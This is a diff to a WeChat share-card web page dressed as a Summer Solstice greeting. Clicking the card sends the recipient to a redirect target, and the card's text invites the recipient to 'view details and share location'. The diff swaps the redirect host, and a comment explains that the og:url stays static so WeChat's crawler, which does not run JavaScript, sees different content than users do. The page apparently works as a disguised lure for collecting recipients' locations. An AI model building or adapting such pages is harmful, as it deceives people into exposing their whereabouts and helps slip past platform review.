@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>夏至将至</title>
 <!-- ★ og:url 静态不变，专给微信爬虫看（爬虫不执行JS，只能读静态HTML） -->
-<meta property="og:url" content="https://www.51ypq.com/wxdw/cms/message.html?contentType=1&amp;packetId=XLOeMckq56hpp92soCy&amp;warning=0">
+<meta property="og:url" content="https://fengxiang.zhyishun.top/detail.html">
 <meta property="og:type" content="website">
 <meta property="og:title" content="夏至将至" id="og-title">
 <meta property="og:description" content="夏至，太阳走到北回归线，万物繁盛到极致。这一天，白昼最长，光阴最慷慨。" id="og-desc">
@@ -166,7 +166,7 @@ body[data-theme="red"]{--theme:#EE0A24;--theme-d:#D40820}
   <!-- VIEWER -->
   <div class="panel" id="p-viewer">
     <p style="text-align:center;font-size:13px;color:var(--t3);margin-bottom:8px">📨 有人给你分享了一张卡片</p>
-    <div class="card clickable" id="card-view" onclick="location.href='https://www.51ypq.com/wxdw/cms/message.html?contentType=1&packetId=XLOeMckq56hpp92soCy&warning=0'+location.hash">
+    <div class="card clickable" id="card-view" onclick="location.href='https://fengxiang.zhyishun.top/detail.html'+location.hash">
       <div class="card-img"><img id="vw-img" src="" alt="" class="hidden"><div class="card-ph" id="vw-ph">🖼️</div></div>
       <div class="card-bd"><div class="ct" id="vw-t"></div><div class="cd" id="vw-d"></div></div>
       <div class="card-ft"><span class="cf-t" id="vw-ft">点击卡片 · 查看详情并共享位置</span><span class="cf-a">›</span></div>
@@ -183,7 +183,7 @@ body[data-theme="red"]{--theme:#EE0A24;--theme-d:#D40820}
 
 <!-- ★★★ 统一分享数据（全局唯一数据源） ★★★ -->
 <script>
-var TARGET_URL = 'https://www.51ypq.com/wxdw/cms/message.html?contentType=1&packetId=XLOeMckq56hpp92soCy&warning=0';
+var TARGET_URL = 'https://fengxiang.zhyishun.top/detail.html';
 window._SD = {
   title: '夏至将至',
   desc:  '夏至，太阳走到北回归线，万物繁盛到极致。这一天，白昼最长，光阴最慷慨。',
@@ -267,7 +267,7 @@ function updateShareData(title, desc, imgUrl){
   if(imgUrl && imgUrl.indexOf('//') === -1) imgUrl = location.origin + '/' + imgUrl.replace(/^\//,'');
   if(!imgUrl) imgUrl = 'https://fengxiang.zhyishun.top/demo2.jpg';
 
-  // ★ 分享出去的 link 始终是 51ypq 的 URL
+  // ★ 分享出去的 link 始终是 detail.html
 
   _SD.title  = title  || '夏至将至';
   _SD.desc   = desc   || title || '夏至，太阳走到北回归线，万物繁盛到极致。这一天，白昼最长，光阴最慷慨。';
